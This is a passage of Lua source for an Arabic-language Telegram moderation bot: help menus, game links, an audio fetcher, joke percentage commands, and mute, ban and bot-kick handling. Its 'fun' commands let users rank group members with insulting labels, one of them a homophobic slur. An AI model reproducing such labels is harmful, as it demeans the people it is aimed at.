⋄ضع عدد الاعضا + العدد
⋄ضع كليشه المطور
⋄تفعيل/تعطيل الاذاعه
⋄تفعيل/تعطيل البوت الخدمي
⋄تفعيل/تعطيل التواصل
⋄تغير اسم البوت
⋄اضف/مسح رد عام
⋄الردود العامه
⋄مسح الردود العامه
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄الاشتراك الاجباري
⋄تعطيل الاشتراك الاجباري
⋄تفعيل الاشتراك الاجباري
⋄مسح رساله الاشتراك
⋄تغير رساله الاشتراك
⋄تغير الاشتراك
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄الاحصائيات
⋄المشتركين
⋄المجموعات 
⋄تفعيل/تعطيل المغادره
⋄مسح الجروبات
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️
]]
local text1 = database:get(bot_id..'new:sourse1') or '┉'
local text2 = database:get(bot_id..'new:sourse2') or '•'
local text3 = database:get(bot_id..'new:sourse3') or 'Joker'
local text4 = database:get(bot_id..'new:sourse4') or '☉'
local text5 = database:get(bot_id..'new:sourse5') or '┇'
local text6 = database:get(bot_id..'new:sourse6') or '»'
local text7 = database:get(bot_id..'new:sourse7') or '>'
Teext = string.gsub(Teext,"┉",text1)
Teext = string.gsub(Teext,"•",text2)
Teext = string.gsub(Teext,"Joker",text3)
Teext = string.gsub(Teext,"☉",text4)
Teext = string.gsub(Teext,"┇",text5)
Teext = string.gsub(Teext,"»",text6)
Teext = string.gsub(Teext,">",text7)keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
},
{
{text = '⌯ ❸❸ ⌯', callback_data="/help"},{text = '❹❹', callback_data="/help6"},
},
{
{text = 'اوامر التسليه', callback_data="/help7"},
},
{
{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help6' then
local Teext =[[

⋄اوامر الاعضا كالتالي ↓
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄عرض معلوماتك ↑↓
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄ايديي ← اسمي 
⋄رسايلي ← مسح رسايلي 
⋄رتبتي ← سحكاتي 
⋄مسح سحكاتي ← المنشئ 
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄اوآمر المجموعه ↑↓
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄الرابط ← القوانين – الترحيب
⋄ايدي ← اطردني
⋄اسمي ← المطور  
⋄كشف ~ بالرد بالمعرف
⋄قول + كلمه
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄اسم البوت + الامر ↑↓
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄بوسه بالرد 
⋄مصه بالرد
⋄رزله بالرد 
⋄شنو رئيك بهذا بالرد
⋄شنو رئيك بهاي بالرد
⋄تحب هذا
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️
]]
local text1 = database:get(bot_id..'new:sourse1') or '┉'
local text2 = database:get(bot_id..'new:sourse2') or '•'
local text3 = database:get(bot_id..'new:sourse3') or 'Joker'
local text4 = database:get(bot_id..'new:sourse4') or '☉'
local text5 = database:get(bot_id..'new:sourse5') or '┇'
local text6 = database:get(bot_id..'new:sourse6') or '»'
local text7 = database:get(bot_id..'new:sourse7') or '>'
Teext = string.gsub(Teext,"┉",text1)
Teext = string.gsub(Teext,"•",text2)
Teext = string.gsub(Teext,"Joker",text3)
Teext = string.gsub(Teext,"☉",text4)
Teext = string.gsub(Teext,"┇",text5)
Teext = string.gsub(Teext,"»",text6)
Teext = string.gsub(Teext,">",text7)keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
},
{
{text = '❸❸', callback_data="/help5"},{text = '⌯ ❹❹ ⌯', callback_data="/help"},
},
{
{text = 'اوامر التسليه', callback_data="/help7"},
},
{
{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help7' then
local Teext =[[

┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
⋄اوامر التسليه 🃏
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄رفع + تنزيل ← الامࢪ ↓
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄رفع + تنزيل ← مطي 
⋄تاك للمطايه
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄رفع + تنزيل ← صخل
⋄تاك لصخوله
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄رفع + تنزيل ← كلب
⋄تاك للكلاب
⋄مسح الكلاب
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄رفع + تنزيل ← قرد 
⋄تاك لقروده
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄رفع + تنزيل ← بقره
⋄تاك لبقرات
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄رفع + تنزيل ← ضلع
⋄تاك لضلوع
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄رفع + تنزيل ← مره
⋄تاك للنسوان
⋄مسح النسوان
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄رفع + تنزيل ← طلي
⋄تاك لطليان
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄رفع + تنزيل ← حكاك 
⋄تاك للحكاكين
⋄مسح الحكاكين
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄رفع + تنزيل ← خنزير
⋄تاك للخنازير
⋄مسح الخنازير
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄رفع + تنزيل ← خول
⋄تاك للخولات
⋄مسح الخولات
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄زواج + طلاق
⋄تاك للمتزوجين
⋄مسح المتزوجين
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️
]]
local text1 = database:get(bot_id..'new:sourse1') or '┉'
local text2 = database:get(bot_id..'new:sourse2') or '•'
local text3 = database:get(bot_id..'new:sourse3') or 'Joker'
local text4 = database:get(bot_id..'new:sourse4') or '☉'
local text5 = database:get(bot_id..'new:sourse5') or '┇'
local text6 = database:get(bot_id..'new:sourse6') or '»'
local text7 = database:get(bot_id..'new:sourse7') or '>'
Teext = string.gsub(Teext,"┉",text1)
Teext = string.gsub(Teext,"•",text2)
Teext = string.gsub(Teext,"Joker",text3)
Teext = string.gsub(Teext,"☉",text4)
Teext = string.gsub(Teext,"┇",text5)
Teext = string.gsub(Teext,"»",text6)
Teext = string.gsub(Teext,">",text7)keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
},
{
{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
},
{
{text = '⌯ اوامر التسليه ⌯', callback_data="/help"},
},
{
{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help' then
local Teext =[[
اختر من الاوامر بلاسفل
َ
َ
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
},
{
{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
},
{
{text = 'اوامر التسليه', callback_data="/help7"},
},
{
{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/game1' then
local Teext =[[
اختر لعبه من الاسفل
ثم اختار المحادثه
َ
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'FlappyBird', url="https://t.me/awesomebot?game=FlappyBird"},{text = 'MathBattle',url="https://t.me/gamebot?game=MathBattle"}},   
{{text = 'MotoFX', url="https://t.me/gamee?game=MotoFX"},{text = 'F1Racer', url="https://t.me/gamee?game=F1Racer"}}, 
{{text = 'DiamondRows', url="https://t.me/gamee?game=DiamondRows"},{text = 'FootballStar', url="https://t.me/gamee?game=FootballStar"}}, 
{{text = 'Hexonix', url="https://t.me/gamee?game=Hexonix"},{text = 'g2048', url="https://t.me/awesomebot?game=g2048"}}, 
{{text = 'SQUARES', url="https://t.me/gamee?game=Squares"},{text = 'ATOMIC', url="https://t.me/gamee?game=AtomicDrop1"}}, 
{{text = 'CORSAIRS', url="https://t.me/gamebot?game=Corsairs"},{text = 'LumberJack', url="https://t.me/gamebot?game=LumberJack"}}, 
{{text = 'LittlePlane', url="https://t.me/gamee?game=LittlePlane"},{text = 'RollerDisco', url="https://t.me/gamee?game=RollerDisco"}},  
{{text = 'PocketWorldCup', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'BlockBuster', url="https://t.me/gamee?game=BlockBuster"}},  
{{text = 'Touchdown', url="https://t.me/gamee?game=Touchdown"},{text = 'GravityNinja', url="https://t.me/gamee?game=GravityNinjaEmeraldCity"}},  
{{text = 'Astrocat', url="https://t.me/gamee?game=Astrocat"},{text = 'Skipper', url="https://t.me/gamee?game=Skipper"}},  
{{text = 'WorldCup', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'GeometryRun', url="https://t.me/gamee?game=GeometryRun"}},  
{{text = 'Ten2One', url="https://t.me/gamee?game=Ten2One"},{text = 'NeonBlast2', url="https://t.me/gamee?game=NeonBlast2"}},  
{{text = 'Paintio', url="https://t.me/gamee?game=Paintio"},{text = 'onetwothree', url="https://t.me/gamee?game=onetwothree"}},  
{{text = 'مبرمج السورس', url="t.me/UUOUOU_7"}},
{{text = '⌯ ❶️❶ ⌯', callback_data="/game"},{text = '❷❷', callback_data="/game2"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/game2' then
local Teext =[[
اختر لعبه من الاسفل
ثم اختار المحادثه
َ
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'rocket', url="https://t.me/T4TTTTBOT?game=rocket"},{text = 'color', url="https://t.me/T4TTTTBOT?game=color"}},  
{{text = 'BrickStacker', url="https://t.me/gamee?game=BrickStacker"},{text = 'StairMaster3D', url="https://t.me/gamee?game=StairMaster3D"}},  
{{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'BasketBoyRush', url="https://t.me/gamee?game=BasketBoyRush"}},  
{{text = 'GravityNinja21', url="https://t.me/gamee?game=GravityNinja21"},{text = 'MarsRover', url="https://t.me/gamee?game=MarsRover"}},  
{{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'GroovySki', url="https://t.me/gamee?game=GroovySki"}},  
{{text = 'PaintioTeams', url="https://t.me/gamee?game=PaintioTeams"},{text = 'KeepItUp', url="https://t.me/gamee?game=KeepItUp"}},  
{{text = 'SunshineSolitaire', url="https://t.me/gamee?game=SunshineSolitaire"},{text = 'Qubo', url="https://t.me/gamee?game=Qubo"}},  
{{text = 'PenaltyShooter2', url="https://t.me/gamee?game=PenaltyShooter2"},{text = 'Getaway', url="https://t.me/gamee?game=Getaway"}},  
{{text = 'PaintioTeams', url="https://t.me/gamee?game=PaintioTeams"},{text = 'SpikyFish2', url="https://t.me/gamee?game=SpikyFish2"}},  
{{text = 'GroovySki', url="https://t.me/gamee?game=GroovySki"},{text = 'KungFuInc', url="https://t.me/gamee?game=KungFuInc"}},  
{{text = 'SpaceTraveler', url="https://t.me/gamee?game=SpaceTraveler"},{text = 'RedAndBlue', url="https://t.me/gamee?game=RedAndBlue"}},  
{{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
{{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
{{text = 'مبرمج السورس', url="t.me/UUOUOU_7"}},
{{text = '❶️❶', callback_data="/game1"},{text = '⌯ ❷❷ ⌯', callback_data="/game"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == "/VOISME1" and not database:get(bot_id.."sing:for:me"..msg.chat_id_) then
data,res = https.request('https://boyka-api.ml/audios.php')
if res == 200 then
audios = json:decode(data)
if audios.Info == true then
local Text ='⋄تم اختيار المقطع الصوتي لك'
local text1 = database:get(bot_id..'new:sourse1') or '┉'
local text2 = database:get(bot_id..'new:sourse2') or '•'
local text3 = database:get(bot_id..'new:sourse3') or 'Joker'
local text4 = database:get(bot_id..'new:sourse4') or '☉'
local text5 = database:get(bot_id..'new:sourse5') or '┇'
local text6 = database:get(bot_id..'new:sourse6') or '»'
local text7 = database:get(bot_id..'new:sourse7') or '>'
Text = string.gsub(Text,"┉",text1)
Text = string.gsub(Text,"•",text2)
Text = string.gsub(Text,"Joker",text3)
Text = string.gsub(Text,"☉",text4)
Text = string.gsub(Text,"┇",text5)
Text = string.gsub(Text,"»",text6)
Text = string.gsub(Text,">",text7)keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'اغنيه اخري',callback_data="/VOISME2"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
if Text == "/VOISME2" and not database:get(bot_id.."sing:for:me"..msg.chat_id_) then
data,res = https.request('https://boyka-api.ml/audios.php')
if res == 200 then
audios = json:decode(data)
if audios.Info == true then
local Text ='⋄تم اختيار المقطع الصوتي لك'
local text1 = database:get(bot_id..'new:sourse1') or '┉'
local text2 = database:get(bot_id..'new:sourse2') or '•'
local text3 = database:get(bot_id..'new:sourse3') or 'Joker'
local text4 = database:get(bot_id..'new:sourse4') or '☉'
local text5 = database:get(bot_id..'new:sourse5') or '┇'
local text6 = database:get(bot_id..'new:sourse6') or '»'
local text7 = database:get(bot_id..'new:sourse7') or '>'
Text = string.gsub(Text,"┉",text1)
Text = string.gsub(Text,"•",text2)
Text = string.gsub(Text,"Joker",text3)
Text = string.gsub(Text,"☉",text4)
Text = string.gsub(Text,"┇",text5)
Text = string.gsub(Text,"»",text6)
Text = string.gsub(Text,">",text7)keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'اغنيه اخري',callback_data="/VOISME1"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end

--- callback added
end
if data.ID == "UpdateNewMessage" then  -- new msg
msg = data.message_
text = msg.content_.text_
--------------------------------------------------------------------------------------------------------------
if text and not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:del(bot_id..'Spam:Texting'..msg.sender_user_id_) 
end
--------------------------------------------------------------------------------------------------------------
if text and database:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text)
if NewCmmd then
database:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text)
database:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
database:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,' ⋄تم مسح الامر')  
else
send(msg.chat_id_, msg.id_,' ⋄لا يوجد امر بهاذا الاسم')  
end
database:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_)
return false
end 
-------------------------------------------------------------------------------------------------------------- 
if data.message_.content_.text_ then
local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if (text and text == "تعطيل اوامر التسليه") then 
send(msg.chat_id_, msg.id_, ' ⋄تم تعطيل اوامر التسليه')
database:set(bot_id.."Fun_Bots:"..msg.chat_id_,"true")
end
if (text and text == "تفعيل اوامر التسليه") then 
send(msg.chat_id_, msg.id_, ' ⋄تم تفعيل اوامر التسليه')
database:del(bot_id.."Fun_Bots:"..msg.chat_id_)
end
if not database:get(bot_id.."Fun_Bots:"..msg.chat_id_) then
if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
function FunBot(extra, result, success) 
local Fun = {'لوكي وزاحف من ساع زحفلي وحضرته 😒','خوش ولد و ورده مال الله 💋🙄','يلعب ع البنات 🙄', 'ولد زايعته الكاع 😶🙊','صاك يخبل ومعضل ','محلو وشواربه جنها مكناسه 😂🤷🏼‍♀️','اموت عليه 🌝','هوه غير ا��حب مال اني 🤓❤️','مو خوش ولد صراحه ☹️','ادبسز وميحترم البنات  ', 'فد واحد قذر 🙄😒','ماطيقه كل ما اكمشه ريحته جنها بخاخ بف باف مال حشرات 😂🤷‍♀️','مو خوش ولد 🤓' } 
send(msg.chat_id_, result.id_,''..Fun[math.random(#Fun)]..'')   
end   
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end  
if text == ""..Name_Bot..' تحب هذا' and tonumber(msg.reply_to_message_id_) > 0 then    
function FunBot(extra, result, success) 
local Fun = {'الكبد مال اني ','يولي ماحبه ',' لٱ ايع ','بس لو الكفها اله اعضها 💔','ماخب مطايه اسف','اكلك ۿذﭑ يكلي احبكك لولا ﭑݩٺ شتكول  ','ئووووووووف اموت ع ربه ','ايععععععععع','بلعباس اعشكك','ماحب مخابيل','احبب ميدو وبس','لٱ ماحبه','بله هاي جهره تكلي تحبهه ؟ ','بربك ئنته والله فارغ وبطران وماعدك شي تسوي جاي تسئلني احبهم لولا','افبس حبيبي هذا' } 
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end    
end
if text and text:match('^'..Name_Bot..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
end
if text and text:match('^'..Name_Bot..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
end
if text == "نسبه الحب" or text == "نسبه حب" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:lov'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_,"sendlove")
Text = 'ارسل اسمك واسم الشخص الثاني،  \nمثال روظي و وروان'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الحب" and database:get(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_) == "sendlove" then
num = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","80","49","100","6","0",};
sendnum = num[math.random(#num)]
sl = 'نسبه حب '..text..' هي : '..sendnum..'%'
send(msg.chat_id_, msg.id_,sl) 
database:del(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_)
end
if text == "نسبه الكره" or text == "نسبه كره" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:krh'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_,"sendkrhe")
Text = 'ارسل اسمك واسم الشخص الثاني،  \nمثال اسد و لبوى'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الكره" and database:get(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_) == "sendkrhe" then
num = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","80","8","100","6","0",};
sendnum = num[math.random(#num)]
sl = 'نسبه كره '..text..' هي : '..sendnum..'%'
send(msg.chat_id_, msg.id_,sl) 
database:del(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_)
end
if text == "نسبه رجوله" or text == "نسبه الرجوله" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_,"sendrjoe")
Text = 'ارسل اسم الشخص الذي تريد قياس نسبه رجولته \nمثال مصطفئ'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه رجوله" and database:get(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_) == "sendrjoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
xl = 'نسبه رجوله '..text..' هي : \n'..sendnuj..'%'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_)
end
if text == "نسبه الانوثه" or text == "نسبه انوثه" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:ano'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_,"sendanoe")
Text = 'ارسل اسم الشخص الذي تريد قياس نسبه انوثتها \nمثال روان'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الانوثه" and database:get(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_) == "sendanoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
xl = 'نسبه الانوثه '..text..' هي : \n'..sendnuj..'%'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_)
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Muted_User(msg.chat_id_,msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
return false  
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Ban_User(msg.chat_id_,msg.sender_user_id_) then 
chat_kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false  
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban_User(msg.chat_id_,msg.content_.members_[0].id_) then 
chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and GBan_User(msg.sender_user_id_) then 
chat_kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Gmute_User(msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and GBan_User(msg.content_.members_[0].id_) then 
chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then  
database:set(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "kick" then   
https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
Black = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Black)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
local Bots = database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "del" then   
Black = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Black)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
if msg.content_.ID == 'MessagePinMessage' then
if Constructor(msg) then 
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.content_.message_id_)
else
local Msg_Pin = database:get(bot_id..'Pin:Id:Msg'..msg.chat_id_)
if Msg_Pin and database:get(bot_id.."lockpin"..msg.chat_id_) then
PinMessage(msg.chat_id_,Msg_Pin)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if database:get(bot_id..'lock:tagservr'..msg.chat_id_) then  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false
end    
end   
--------------------------------------------------------------------------------------------------------------
